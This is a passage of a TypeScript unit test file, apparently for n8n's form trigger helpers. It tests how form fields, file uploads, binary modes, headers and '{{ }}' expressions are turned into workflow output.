		]);

		expect(result.formFields[1].multiSelectOptions).toEqual([
			{ id: 'option0_field-1', label: 'React' },
			{ id: 'option1_field-1', label: 'Vue' },
		]);
	});

	it('should handle radio fields with unique IDs when multiple radio fields exist', () => {
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Experience Level',
				fieldType: 'radio',
				requiredField: true,
				fieldOptions: {
					values: [{ option: 'Junior' }, { option: 'Senior' }],
				},
			},
			{
				fieldLabel: 'Work Preference',
				fieldType: 'radio',
				requiredField: true,
				fieldOptions: {
					values: [{ option: 'Remote' }, { option: 'Office' }],
				},
			},
		];

		const query = {
			'Experience Level': 'Senior',
			'Work Preference': 'Remote',
		};

		const result = prepareFormData({
			formTitle: 'Job Survey',
			formDescription: 'Your work preferences',
			formSubmittedText: 'Thanks!',
			redirectUrl: 'example.com',
			formFields,
			testRun: false,
			query,
		});

		expect(result.formFields[0].multiSelectOptions).toEqual([
			{ id: 'option0_field-0', label: 'Junior' },
			{ id: 'option1_field-0', label: 'Senior' },
		]);

		expect(result.formFields[1].multiSelectOptions).toEqual([
			{ id: 'option0_field-1', label: 'Remote' },
			{ id: 'option1_field-1', label: 'Office' },
		]);
	});

	describe('Version 2.4+ fieldName support', () => {
		it('should use fieldName for query parameters in v2.4+', () => {
			const formFields: FormFieldsParameter = [
				{
					fieldName: 'userName',
					fieldLabel: 'User Name',
					fieldType: 'text',
				},
			];
			const query: IDataObject = { userName: 'John Doe' };

			const result = prepareFormData({
				formTitle: 'Test Form',
				formDescription: 'Test Description',
				formSubmittedText: undefined,
				redirectUrl: undefined,
				formFields,
				testRun: true,
				query,
				nodeVersion: 2.4,
			});

			expect(result.formFields[0].defaultValue).toBe('John Doe');
			expect(result.formFields[0].label).toBe('User Name'); // Label should still be fieldLabel for rendering
		});

		it('should use fieldLabel for query parameters in v2.3 and earlier', () => {
			const formFields: FormFieldsParameter = [
				{
					fieldName: 'userName',
					fieldLabel: 'User Name',
					fieldType: 'text',
				},
			];
			const query: IDataObject = { 'User Name': 'John Doe' };

			const result = prepareFormData({
				formTitle: 'Test Form',
				formDescription: 'Test Description',
				formSubmittedText: undefined,
				redirectUrl: undefined,
				formFields,
				testRun: true,
				query,
				nodeVersion: 2.3,
			});

			expect(result.formFields[0].defaultValue).toBe('John Doe');
			expect(result.formFields[0].label).toBe('User Name');
		});

		it('should fallback to fieldLabel if fieldName is missing in v2.4+', () => {
			const formFields: FormFieldsParameter = [
				{
					fieldLabel: 'User Name',
					fieldType: 'text',
				},
			];
			const query: IDataObject = { 'User Name': 'John Doe' };

			const result = prepareFormData({
				formTitle: 'Test Form',
				formDescription: 'Test Description',
				formSubmittedText: undefined,
				redirectUrl: undefined,
				formFields,
				testRun: true,
				query,
				nodeVersion: 2.4,
			});

			expect(result.formFields[0].defaultValue).toBe('John Doe');
			expect(result.formFields[0].label).toBe('User Name');
		});
	});
});

describe('addFormResponseDataToReturnItem - Checkbox and Radio Fields', () => {
	it('should process checkbox field data correctly', () => {
		const returnItem: INodeExecutionData = { json: {} };
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Hobbies',
				fieldType: 'checkbox',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'Reading' }, { option: 'Gaming' }],
				},
			},
		];
		const bodyData: IDataObject = {
			'field-0': '["Reading", "Gaming"]',
		};

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);

		expect(returnItem.json.Hobbies).toEqual(['Reading', 'Gaming']);
	});

	it('should process radio field data correctly', () => {
		const returnItem: INodeExecutionData = { json: {} };
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Preferred Contact',
				fieldType: 'radio',
				requiredField: true,
				fieldOptions: {
					values: [{ option: 'Email' }, { option: 'Phone' }],
				},
			},
		];
		const bodyData: IDataObject = {
			'field-0': '["Email"]',
		};

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);

		expect(returnItem.json['Preferred Contact']).toBe('Email');
	});

	it('should handle radio field with array value by taking first element', () => {
		const returnItem: INodeExecutionData = { json: {} };
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Priority Level',
				fieldType: 'radio',
				requiredField: true,
				fieldOptions: {
					values: [{ option: 'High' }, { option: 'Medium' }, { option: 'Low' }],
				},
			},
		];
		const bodyData: IDataObject = {
			'field-0': '["High", "Medium"]',
		};

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);

		expect(returnItem.json['Priority Level']).toBe('High');
	});

	it('should handle checkbox field with null value', () => {
		const returnItem: INodeExecutionData = { json: {} };
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Optional Features',
				fieldType: 'checkbox',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'Feature A' }, { option: 'Feature B' }],
				},
			},
		];
		const bodyData: IDataObject = {};

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);

		expect(returnItem.json['Optional Features']).toBeNull();
	});

	it('should handle radio field with null value', () => {
		const returnItem: INodeExecutionData = { json: {} };
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Rating',
				fieldType: 'radio',
				requiredField: false,
				fieldOptions: {
					values: [{ option: '1 Star' }, { option: '2 Stars' }],
				},
			},
		];
		const bodyData: IDataObject = {};

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);

		expect(returnItem.json.Rating).toBeNull();
	});

	it('should process mixed form data with checkbox, radio, and other fields', () => {
		const returnItem: INodeExecutionData = { json: {} };
		const formFields: FormFieldsParameter = [
			{
				fieldLabel: 'Name',
				fieldType: 'text',
				requiredField: true,
			},
			{
				fieldLabel: 'Skills',
				fieldType: 'checkbox',
				requiredField: false,
				fieldOptions: {
					values: [{ option: 'JavaScript' }, { option: 'Python' }],
				},
			},
			{
				fieldLabel: 'Experience',
				fieldType: 'radio',
				requiredField: true,
				fieldOptions: {
					values: [{ option: 'Junior' }, { option: 'Senior' }],
				},
			},
		];
		const bodyData: IDataObject = {
			'field-0': 'John Doe',
			'field-1': '["JavaScript", "Python"]',
			'field-2': '["Senior"]',
		};

		addFormResponseDataToReturnItem(returnItem, formFields, bodyData);

		expect(returnItem.json.Name).toBe('John Doe');
		expect(returnItem.json.Skills).toEqual(['JavaScript', 'Python']);
		expect(returnItem.json.Experience).toBe('Senior');
	});
});

vi.mock('luxon', () => ({
	DateTime: {
		fromFormat: vi.fn().mockReturnValue({
			toFormat: vi.fn().mockReturnValue('formatted-date'),
		}),
		now: vi.fn().mockReturnValue({
			setZone: vi.fn().mockReturnValue({
				toISO: vi.fn().mockReturnValue('2023-04-01T12:00:00.000Z'),
			}),
		}),
	},
}));

describe('prepareFormReturnItem', () => {
	const mockContext = mock<IWebhookFunctions>({
		getRequestObject: vi
			.fn()
			.mockReturnValue({ method: 'GET', query: {}, contentType: 'multipart/form-data' }),
		nodeHelpers: mock({
			copyBinaryFile: vi.fn().mockResolvedValue({}),
		}),
	});
	const formNode = mock<INode>({ type: 'n8n-nodes-base.formTrigger' });

	beforeEach(() => {
		vi.clearAllMocks();
		mockContext.getBodyData.mockReturnValue({ data: {}, files: {} });
		mockContext.getTimezone.mockReturnValue('UTC');
		mockContext.getNode.mockReturnValue(formNode);
		mockContext.getWorkflowStaticData.mockReturnValue({});
		mockContext.getWorkflowSettings.mockReturnValue(mock<IWorkflowSettings>({}));
	});

	it('should handle empty form submission', async () => {
		const result = await prepareFormReturnItem(mockContext, [], 'test');

		expect(result).toEqual({
			json: {
				submittedAt: '2023-04-01T12:00:00.000Z',
				formMode: 'test',
			},
		});
	});

	it('should process text fields correctly', async () => {
		mockContext.getBodyData.mockReturnValue({
			data: { 'field-0': ' test value ' },
			files: {},
		});

		const formFields = [{ fieldLabel: 'Text Field', fieldType: 'text' }];
		const result = await prepareFormReturnItem(mockContext, formFields, 'production');

		expect(result.json['Text Field']).toBe('test value');
		expect(result.json.formMode).toBe('production');
	});

	it('should process number fields correctly', async () => {
		mockContext.getBodyData.mockReturnValue({
			data: { 'field-0': '42' },
			files: {},
		});

		const formFields = [{ fieldLabel: 'Number Field', fieldType: 'number' }];
		const result = await prepareFormReturnItem(mockContext, formFields, 'test');

		expect(result.json['Number Field']).toBe(42);
	});

	it('should handle file uploads', async () => {
		const mockFile: Partial<MultiPartFormData.File> = {
			filepath: '/tmp/uploaded-file',
			originalFilename: 'test.txt',
			mimetype: 'text/plain',
			size: 1024,
		};

		mockContext.getBodyData.mockReturnValue({
			data: {},
			files: { 'field-0': mockFile },
		});

		const formFields = [{ fieldLabel: 'File Upload', fieldType: 'file' }];
		const result = await prepareFormReturnItem(mockContext, formFields, 'test');

		expect(result.json['File Upload']).toEqual({
			filename: 'test.txt',
			mimetype: 'text/plain',
			size: 1024,
		});
		expect(result.binary).toBeDefined();
		expect(result.binary!.File_Upload).toEqual({});
	});

	it('should handle multiple file uploads', async () => {
		const mockFiles: Array<Partial<MultiPartFormData.File>> = [
			{ filepath: '/tmp/file1', originalFilename: 'file1.txt', mimetype: 'text/plain', size: 1024 },
			{ filepath: '/tmp/file2', originalFilename: 'file2.txt', mimetype: 'text/plain', size: 2048 },
		];

		mockContext.getBodyData.mockReturnValue({
			data: {},
			files: { 'field-0': mockFiles },
		});

		const formFields = [{ fieldLabel: 'Multiple Files', fieldType: 'file', multipleFiles: true }];
		const result = await prepareFormReturnItem(mockContext, formFields, 'test');

		expect(result.json['Multiple Files']).toEqual([
			{ filename: 'file1.txt', mimetype: 'text/plain', size: 1024 },
			{ filename: 'file2.txt', mimetype: 'text/plain', size: 2048 },
		]);
		expect(result.binary).toBeDefined();
		expect(result.binary!.Multiple_Files_0).toEqual({});
		expect(result.binary!.Multiple_Files_1).toEqual({});
	});

	it('should call rm to clean up temporary files after file processing', async () => {
		const rmSpy = vi.mocked(rm);
		rmSpy.mockResolvedValue(undefined);

		const mockFiles: Array<Partial<MultiPartFormData.File>> = [
			{ filepath: '/tmp/file1', originalFilename: 'file1.txt', mimetype: 'text/plain', size: 1024 },
			{ filepath: '/tmp/file2', originalFilename: 'file2.txt', mimetype: 'text/plain', size: 2048 },
		];

		mockContext.getBodyData.mockReturnValue({
			data: {},
			files: { 'field-0': mockFiles },
		});

		const formFields = [{ fieldLabel: 'Multiple Files', fieldType: 'file', multipleFiles: true }];
		await prepareFormReturnItem(mockContext, formFields, 'test');

		expect(rmSpy).toHaveBeenCalledTimes(2);
		expect(rmSpy).toHaveBeenCalledWith('/tmp/file1', { force: true });
		expect(rmSpy).toHaveBeenCalledWith('/tmp/file2', { force: true });

		rmSpy.mockRestore();
	});

	it('should format date fields', async () => {
		mockContext.getBodyData.mockReturnValue({
			data: { 'field-0': '2023-04-01' },
			files: {},
		});

		const formFields = [{ fieldLabel: 'Date Field', fieldType: 'date', formatDate: 'dd/MM/yyyy' }];
		const result = await prepareFormReturnItem(mockContext, formFields, 'test');

		expect(result.json['Date Field']).toBe('formatted-date');
		expect(DateTime.fromFormat).toHaveBeenCalledWith('2023-04-01', 'yyyy-mm-dd');
	});

	it('should not format date fields when formatDate is undefined', async () => {
		mockContext.getBodyData.mockReturnValue({
			data: { 'field-0': '2023-04-01' },
			files: {},
		});

		const formFields = [{ fieldLabel: 'Date Field', fieldType: 'date', formatDate: undefined }];
		const result = await prepareFormReturnItem(mockContext, formFields, 'test');

		expect(DateTime.fromFormat).not.toHaveBeenCalled();
		expect(result.json['Date Field']).toBe('2023-04-01');
	});

	it('should handle multiselect fields', async () => {
		mockContext.getBodyData.mockReturnValue({
			data: { 'field-0': '["option1", "option2"]' },
			files: {},
		});

		const formFields = [{ fieldLabel: 'Multiselect', fieldType: 'multiSelect', multiselect: true }];
		const result = await prepareFormReturnItem(mockContext, formFields, 'test');

		expect(result.json.Multiselect).toEqual(['option1', 'option2']);
	});

	it('should use workflow timezone when specified', async () => {
		mockContext.getTimezone.mockReturnValue('America/New_York');

		await prepareFormReturnItem(mockContext, [], 'test', true);

		expect(mockContext.getTimezone).toHaveBeenCalled();
		expect(DateTime.now().setZone).toHaveBeenCalledWith('America/New_York');
	});

	it('should not include workflow static data for form trigger node', async () => {
		const staticData = { queryParam: 'value' };
		mockContext.getWorkflowStaticData.mockReturnValue(staticData);

		const result = await prepareFormReturnItem(mockContext, [], 'test');

		expect(result.json.formQueryParameters).toBeUndefined();
	});

	it('should include query parameters if present and is trigger node', async () => {
		mockContext.getRequestObject.mockReturnValue({
			method: 'POST',
			query: { param: 'value' },
			contentType: 'multipart/form-data',
		} as unknown as Request);

		const result = await prepareFormReturnItem(mockContext, [], 'test');

		expect(result.json.formQueryParameters).toEqual({ param: 'value' });
	});

	it('should not include query parameters if empty', async () => {
		mockContext.getRequestObject.mockReturnValue({
			method: 'POST',
			query: {},
			contentType: 'multipart/form-data',
		} as unknown as Request);

		const result = await prepareFormReturnItem(mockContext, [], 'test');

		expect(result.json.formQueryParameters).toBeUndefined();
	});

	describe('Version 2.4+ fieldName support', () => {
		it('should use fieldName for binary property names in v2.4+', async () => {
			const mockFile: Partial<MultiPartFormData.File> = {
				filepath: '/tmp/uploaded-file',
				originalFilename: 'test.txt',
				mimetype: 'text/plain',
				size: 1024,
				newFilename: 'test.txt',
			};

			mockContext.getBodyData.mockReturnValue({
				data: {},
				files: { 'field-0': mockFile },
			});

			mockContext.getNode.mockReturnValue({
				...formNode,
				typeVersion: 2.4,
			} as INode);

			const formFields: FormFieldsParameter = [
				{
					fieldName: 'resume',
					fieldLabel: 'Resume Upload',
					fieldType: 'file',
				},
			];

			const result = await prepareFormReturnItem(mockContext, formFields, 'test');

			expect(result.binary).toBeDefined();
			expect(result.binary!.resume).toBeDefined();
			expect(result.binary!['Resume_Upload']).toBeUndefined();
		});

		it('should use fieldLabel for binary property names in v2.3 and earlier', async () => {
			const mockFile: Partial<MultiPartFormData.File> = {
				filepath: '/tmp/uploaded-file',
				originalFilename: 'test.txt',
				mimetype: 'text/plain',
				size: 1024,
				newFilename: 'test.txt',
			};

			mockContext.getBodyData.mockReturnValue({
				data: {},
				files: { 'field-0': mockFile },
			});

			mockContext.getNode.mockReturnValue({
				...formNode,
				typeVersion: 2.3,
			} as INode);

			const formFields: FormFieldsParameter = [
				{
					fieldName: 'resume',
					fieldLabel: 'Resume Upload',
					fieldType: 'file',
				},
			];

			const result = await prepareFormReturnItem(mockContext, formFields, 'test');

			expect(result.binary).toBeDefined();
			expect(result.binary!['Resume_Upload']).toBeDefined();
			expect(result.binary!.resume).toBeUndefined();
		});

		it('should use fieldName for output data keys in v2.4+', async () => {
			mockContext.getBodyData.mockReturnValue({
				data: { 'field-0': 'John Doe' },
				files: {},
			});

			mockContext.getNode.mockReturnValue({
				...formNode,
				typeVersion: 2.4,
			} as INode);

			const formFields: FormFieldsParameter = [
				{
					fieldName: 'userName',
					fieldLabel: 'User Name',
					fieldType: 'text',
				},
			];

			const result = await prepareFormReturnItem(mockContext, formFields, 'test');

			expect(result.json.userName).toBe('John Doe');
			expect(result.json['User Name']).toBeUndefined();
		});

		it('should use fieldLabel for output data keys in v2.3 and earlier', async () => {
			mockContext.getBodyData.mockReturnValue({
				data: { 'field-0': 'John Doe' },
				files: {},
			});

			mockContext.getNode.mockReturnValue({
				...formNode,
				typeVersion: 2.3,
			} as INode);

			const formFields: FormFieldsParameter = [
				{
					fieldName: 'userName',
					fieldLabel: 'User Name',
					fieldType: 'text',
				},
			];

			const result = await prepareFormReturnItem(mockContext, formFields, 'test');

			expect(result.json['User Name']).toBe('John Doe');
			expect(result.json.userName).toBeUndefined();
		});
	});

	it('should return html if field name is set', async () => {
		mockContext.getBodyData.mockReturnValue({
			data: { 'field-0': '<div>hi</div>', 'field-1': '<h1><haha/hi>' },
			files: {},
		});

		const formFields = [
			{ fieldLabel: '', elementName: 'greeting', fieldType: 'html' },
			{ fieldLabel: '', elementName: '', fieldType: 'html' },
		];
		const result = await prepareFormReturnItem(mockContext, formFields, 'production');

		expect(result.json.greeting).toBe('<div>hi</div>');
		expect(result.json.formMode).toBe('production');
	});

	describe('binaryMode feature', () => {
		describe('binaryMode === "combined"', () => {
			beforeEach(() => {
				mockContext.getWorkflowSettings.mockReturnValue(
					mock<IWorkflowSettings>({ binaryMode: BINARY_MODE_COMBINED }),
				);
			});

			it('should place single file binary data in bodyData when binaryMode is "combined"', async () => {
				const mockFile: Partial<MultiPartFormData.File> = {
					filepath: '/tmp/test-file.pdf',
					originalFilename: 'document.pdf',
					mimetype: 'application/pdf',
					size: 2048,
					newFilename: 'document.pdf',
				};

				const mockBinaryData = {
					data: 'mock-binary-data',
					mimeType: 'application/pdf',
					fileName: 'document.pdf',
				};

				mockContext.getBodyData.mockReturnValue({
					data: {},
					files: { 'field-0': mockFile },
				});

				(mockContext.nodeHelpers.copyBinaryFile as Mock).mockResolvedValue(mockBinaryData);

				const formFields: FormFieldsParameter = [
					{ fieldLabel: 'Document', fieldType: 'file', multipleFiles: false },
				];

				const result = await prepareFormReturnItem(mockContext, formFields, 'test');

				expect(result.json.Document).toEqual(mockBinaryData);
				expect(result.binary).toEqual({});
			});

			it('should place multiple files binary data in bodyData array when binaryMode is "combined"', async () => {
				const mockFiles: Array<Partial<MultiPartFormData.File>> = [
					{
						filepath: '/tmp/file1.jpg',
						originalFilename: 'photo1.jpg',
						mimetype: 'image/jpeg',
						size: 1024,
						newFilename: 'photo1.jpg',
					},
					{
						filepath: '/tmp/file2.jpg',
						originalFilename: 'photo2.jpg',
						mimetype: 'image/jpeg',
						size: 2048,
						newFilename: 'photo2.jpg',
					},
				];

				const mockBinaryData1 = {
					data: 'mock-binary-data-1',
					mimeType: 'image/jpeg',
					fileName: 'photo1.jpg',
				};

				const mockBinaryData2 = {
					data: 'mock-binary-data-2',
					mimeType: 'image/jpeg',
					fileName: 'photo2.jpg',
				};

				mockContext.getBodyData.mockReturnValue({
					data: {},
					files: { 'field-0': mockFiles },
				});

				(mockContext.nodeHelpers.copyBinaryFile as Mock)
					.mockResolvedValueOnce(mockBinaryData1)
					.mockResolvedValueOnce(mockBinaryData2);

				const formFields: FormFieldsParameter = [
					{ fieldLabel: 'Photos', fieldType: 'file', multipleFiles: true },
				];

				const result = await prepareFormReturnItem(mockContext, formFields, 'test');

				expect(result.json.Photos).toEqual([mockBinaryData1, mockBinaryData2]);
				expect(result.binary).toEqual({});
			});

			it('should handle mixed form data with files in combined mode', async () => {
				const mockFile: Partial<MultiPartFormData.File> = {
					filepath: '/tmp/resume.pdf',
					originalFilename: 'resume.pdf',
					mimetype: 'application/pdf',
					size: 3072,
					newFilename: 'resume.pdf',
				};

				const mockBinaryData = {
					data: 'mock-resume-data',
					mimeType: 'application/pdf',
					fileName: 'resume.pdf',
				};

				mockContext.getBodyData.mockReturnValue({
					data: {
						'field-0': 'John Doe',
						'field-1': 'john@example.com',
					},
					files: { 'field-2': mockFile },
				});

				(mockContext.nodeHelpers.copyBinaryFile as Mock).mockResolvedValue(mockBinaryData);

				const formFields: FormFieldsParameter = [
					{ fieldLabel: 'Name', fieldType: 'text' },
					{ fieldLabel: 'Email', fieldType: 'email' },
					{ fieldLabel: 'Resume', fieldType: 'file', multipleFiles: false },
				];

				const result = await prepareFormReturnItem(mockContext, formFields, 'test');

				expect(result.json.Name).toBe('John Doe');
				expect(result.json.Email).toBe('john@example.com');
				expect(result.json.Resume).toEqual(mockBinaryData);
				expect(result.binary).toEqual({});
			});
		});

		describe('binaryMode !== "combined" (separate mode)', () => {
			beforeEach(() => {
				mockContext.getWorkflowSettings.mockReturnValue(mock<IWorkflowSettings>({}));
			});

			it('should place single file in returnItem.binary when binaryMode is not "combined"', async () => {
				const mockFile: Partial<MultiPartFormData.File> = {
					filepath: '/tmp/test-file.pdf',
					originalFilename: 'document.pdf',
					mimetype: 'application/pdf',
					size: 2048,
					newFilename: 'document.pdf',
				};

				const mockBinaryData = {
					data: 'mock-binary-data',
					mimeType: 'application/pdf',
					fileName: 'document.pdf',
				};

				mockContext.getBodyData.mockReturnValue({
					data: {},
					files: { 'field-0': mockFile },
				});

				(mockContext.nodeHelpers.copyBinaryFile as Mock).mockResolvedValue(mockBinaryData);

				const formFields: FormFieldsParameter = [
					{ fieldLabel: 'Document', fieldType: 'file', multipleFiles: false },
				];

				const result = await prepareFormReturnItem(mockContext, formFields, 'test');

				expect(result.json.Document).toEqual({
					filename: 'document.pdf',
					mimetype: 'application/pdf',
					size: 2048,
				});

				expect(result.binary).toBeDefined();
				expect(result.binary!.Document).toEqual(mockBinaryData);
			});

			it('should place multiple files in returnItem.binary with indexed names when binaryMode is not "combined"', async () => {
				const mockFiles: Array<Partial<MultiPartFormData.File>> = [
					{
						filepath: '/tmp/file1.jpg',
						originalFilename: 'photo1.jpg',
						mimetype: 'image/jpeg',
						size: 1024,
						newFilename: 'photo1.jpg',
					},
					{
						filepath: '/tmp/file2.jpg',
						originalFilename: 'photo2.jpg',
						mimetype: 'image/jpeg',
						size: 2048,
						newFilename: 'photo2.jpg',
					},
				];

				const mockBinaryData1 = {
					data: 'mock-binary-data-1',
					mimeType: 'image/jpeg',
					fileName: 'photo1.jpg',
				};

				const mockBinaryData2 = {
					data: 'mock-binary-data-2',
					mimeType: 'image/jpeg',
					fileName: 'photo2.jpg',
				};

				mockContext.getBodyData.mockReturnValue({
					data: {},
					files: { 'field-0': mockFiles },
				});

				(mockContext.nodeHelpers.copyBinaryFile as Mock)
					.mockResolvedValueOnce(mockBinaryData1)
					.mockResolvedValueOnce(mockBinaryData2);

				const formFields: FormFieldsParameter = [
					{ fieldLabel: 'Photos', fieldType: 'file', multipleFiles: true },
				];

				const result = await prepareFormReturnItem(mockContext, formFields, 'test');

				expect(result.json.Photos).toEqual([
					{ filename: 'photo1.jpg', mimetype: 'image/jpeg', size: 1024 },
					{ filename: 'photo2.jpg', mimetype: 'image/jpeg', size: 2048 },
				]);

				expect(result.binary).toBeDefined();
				expect(result.binary!.Photos_0).toEqual(mockBinaryData1);
				expect(result.binary!.Photos_1).toEqual(mockBinaryData2);
			});

			it('should handle mixed form data with files in separate mode', async () => {
				const mockFile: Partial<MultiPartFormData.File> = {
					filepath: '/tmp/resume.pdf',
					originalFilename: 'resume.pdf',
					mimetype: 'application/pdf',
					size: 3072,
					newFilename: 'resume.pdf',
				};

				const mockBinaryData = {
					data: 'mock-resume-data',
					mimeType: 'application/pdf',
					fileName: 'resume.pdf',
				};

				mockContext.getBodyData.mockReturnValue({
					data: {
						'field-0': 'John Doe',
						'field-1': 'john@example.com',
					},
					files: { 'field-2': mockFile },
				});

				(mockContext.nodeHelpers.copyBinaryFile as Mock).mockResolvedValue(mockBinaryData);

				const formFields: FormFieldsParameter = [
					{ fieldLabel: 'Name', fieldType: 'text' },
					{ fieldLabel: 'Email', fieldType: 'email' },
					{ fieldLabel: 'Resume', fieldType: 'file', multipleFiles: false },
				];

				const result = await prepareFormReturnItem(mockContext, formFields, 'test');

				expect(result.json.Name).toBe('John Doe');
				expect(result.json.Email).toBe('john@example.com');
				expect(result.json.Resume).toEqual({
					filename: 'resume.pdf',
					mimetype: 'application/pdf',
					size: 3072,
				});
				expect(result.binary).toBeDefined();
				expect(result.binary!.Resume).toEqual(mockBinaryData);
			});

			it('should sanitize field labels for binary property names in separate mode', async () => {
				const mockFile: Partial<MultiPartFormData.File> = {
					filepath: '/tmp/test.pdf',
					originalFilename: 'test.pdf',
					mimetype: 'application/pdf',
					size: 1024,
					newFilename: 'test.pdf',
				};

				const mockBinaryData = {
					data: 'mock-data',
					mimeType: 'application/pdf',
					fileName: 'test.pdf',
				};

				mockContext.getBodyData.mockReturnValue({
					data: {},
					files: { 'field-0': mockFile },
				});

				(mockContext.nodeHelpers.copyBinaryFile as Mock).mockResolvedValue(mockBinaryData);

				const formFields: FormFieldsParameter = [
					{ fieldLabel: 'User Resume (2024)', fieldType: 'file', multipleFiles: false },
				];

				const result = await prepareFormReturnItem(mockContext, formFields, 'test');

				expect(result.binary).toBeDefined();
				expect(result.binary!.User_Resume__2024_).toEqual(mockBinaryData);
			});
		});

		describe('binaryMode comparison tests', () => {
			it('should produce different structures for combined vs separate mode with single file', async () => {
				const mockFile: Partial<MultiPartFormData.File> = {
					filepath: '/tmp/test.txt',
					originalFilename: 'test.txt',
					mimetype: 'text/plain',
					size: 512,
					newFilename: 'test.txt',
				};

				const mockBinaryData = {
					data: 'file-content',
					mimeType: 'text/plain',
					fileName: 'test.txt',
				};

				const formFields: FormFieldsParameter = [
					{ fieldLabel: 'File', fieldType: 'file', multipleFiles: false },
				];

				// Test combined mode
				mockContext.getWorkflowSettings.mockReturnValue(
					mock<IWorkflowSettings>({ binaryMode: BINARY_MODE_COMBINED }),
				);
				mockContext.getBodyData.mockReturnValue({
					data: {},
					files: { 'field-0': mockFile },
				});
				(mockContext.nodeHelpers.copyBinaryFile as Mock).mockResolvedValue(mockBinaryData);

				const resultCombined = await prepareFormReturnItem(mockContext, formFields, 'test');

				// Test separate mode
				mockContext.getWorkflowSettings.mockReturnValue(mock<IWorkflowSettings>({}));
				mockContext.getBodyData.mockReturnValue({
					data: {},
					files: { 'field-0': mockFile },
				});
				(mockContext.nodeHelpers.copyBinaryFile as Mock).mockResolvedValue(mockBinaryData);

				const resultSeparate = await prepareFormReturnItem(mockContext, formFields, 'test');

				// Combined mode: binary data in json
				expect(resultCombined.json.File).toEqual(mockBinaryData);
				expect(resultCombined.binary).toEqual({});

				// Separate mode: metadata in json, binary data in binary property
				expect(resultSeparate.json.File).toEqual({
					filename: 'test.txt',
					mimetype: 'text/plain',
					size: 512,
				});
				expect(resultSeparate.binary!.File).toEqual(mockBinaryData);
			});
		});
	});

	describe('showHeaders', () => {
		it('should include headers when showHeaders is enabled', async () => {
			const mockHeaders = {
				'content-type': 'multipart/form-data',
				'user-agent': 'Mozilla/5.0',
			};
			mockContext.getNodeParameter.calledWith('options.showHeaders', false).mockReturnValue(true);
			mockContext.getHeaderData.mockReturnValue(mockHeaders);

			const result = await prepareFormReturnItem(mockContext, [], 'test');

			expect(result.json.headers).toEqual(mockHeaders);
		});

		it('should not include headers when showHeaders is disabled', async () => {
			mockContext.getNodeParameter.calledWith('options.showHeaders', false).mockReturnValue(false);

			const result = await prepareFormReturnItem(mockContext, [], 'test');

			expect(result.json.headers).toBeUndefined();
		});
	});
});

describe('resolveRawData', () => {
	const mockContext = mock<IWebhookFunctions>();

	const dummyData = {
		name: 'Hanna',
		age: 30,
		city: 'New York',
		isStudent: false,
		hasJob: true,
		grades: {
			math: 95,
			science: 88,
			history: 92,
		},
		hobbies: ['reading', 'painting', 'coding'],
		address: {
			street: '123 Main St',
			zipCode: '10001',
			country: 'USA',
		},
		languages: ['English', 'Spanish'],
		projects: [
			{ name: 'Project A', status: 'completed' },
			{ name: 'Project B', status: 'in-progress' },
		],
		emptyArray: [],
	};

	beforeEach(() => {
		vi.clearAllMocks();

		mockContext.evaluateExpression.mockImplementation((expression: string) => {
			const key = expression.replace(/[{}]/g, '').trim();
			return key.split('.').reduce((obj, prop) => obj?.[prop], dummyData as any);
		});
	});

	it('should return the input string if it does not start with "="', () => {
		const input = 'Hello, world!';
		expect(resolveRawData(mockContext, input)).toBe(input);
	});

	it('should remove leading "=" characters', () => {
		const input = '=Hello, world!';
		expect(resolveRawData(mockContext, input)).toBe('Hello, world!');
	});

	it('should resolve a single expression', () => {
		const input = '=Hello, {{name}}!';
		expect(resolveRawData(mockContext, input)).toBe('Hello, Hanna!');
	});

	it('should resolve multiple expressions', () => {
		const input = '={{name}} is {{age}} years old and lives in {{city}}.';
		expect(resolveRawData(mockContext, input)).toBe('Hanna is 30 years old and lives in New York.');
	});

	it('should handle object resolutions', () => {
		const input = '=Grades: {{grades}}';
		expect(resolveRawData(mockContext, input)).toBe(
			'Grades: {"math":95,"science":88,"history":92}',
		);
	});

	it('should handle nested object properties', () => {
		const input = "={{name}}'s math grade is {{grades.math}}.";
		expect(resolveRawData(mockContext, input)).toBe("Hanna's math grade is 95.");
	});

	it('should handle boolean values', () => {
		const input = '=Is {{name}} a student? {{isStudent}}';
		expect(resolveRawData(mockContext, input)).toBe('Is Hanna a student? false');
	});

	it('should handle expressions with whitespace', () => {
		const input = '={{ name }} is {{ age }} years old.';
		expect(resolveRawData(mockContext, input)).toBe('Hanna is 30 years old.');
	});

	it('should return the original string if no resolvables are found', () => {
		const input = '=Hello, world!';
		expect(resolveRawData(mockContext, input)).toBe('Hello, world!');
	});

	it('should handle non-existent properties gracefully', () => {
		const input = "={{name}}'s favorite color is {{favoriteColor}}.";
		expect(resolveRawData(mockContext, input)).toBe("Hanna's favorite color is undefined.");
	});

	it('should handle mixed resolvable and non-resolvable content', () => {
		const input = '={{name}} lives in {{city}} and enjoys programming.';
		expect(resolveRawData(mockContext, input)).toBe(
			'Hanna lives in New York and enjoys programming.',
		);
	});

	it('should handle boolean values correctly', () => {
		const input = '={{name}} is a student: {{isStudent}}. {{name}} has a job: {{hasJob}}.';
		expect(resolveRawData(mockContext, input)).toBe(
			'Hanna is a student: false. Hanna has a job: true.',
		);
	});

	it('should handle arrays correctly', () => {
		const input = "={{name}}'s hobbies are {{hobbies}}.";
		expect(resolveRawData(mockContext, input)).toBe(
			'Hanna\'s hobbies are ["reading","painting","coding"].',
		);
	});

	it('should handle nested objects correctly', () => {
		const input = '={{name}} lives at {{address.street}}, {{address.zipCode}}.';
		expect(resolveRawData(mockContext, input)).toBe('Hanna lives at 123 Main St, 10001.');
	});

	it('should handle arrays of objects correctly', () => {
		const input = '=Project statuses: {{projects.0.status}}, {{projects.1.status}}.';
		expect(resolveRawData(mockContext, input)).toBe('Project statuses: completed, in-progress.');
	});

	it('should handle empty arrays correctly', () => {
		const input = '=Empty array: {{emptyArray}}.';
		expect(resolveRawData(mockContext, input)).toBe('Empty array: [].');
	});

	it('should handle a mix of different data types', () => {
		const input =
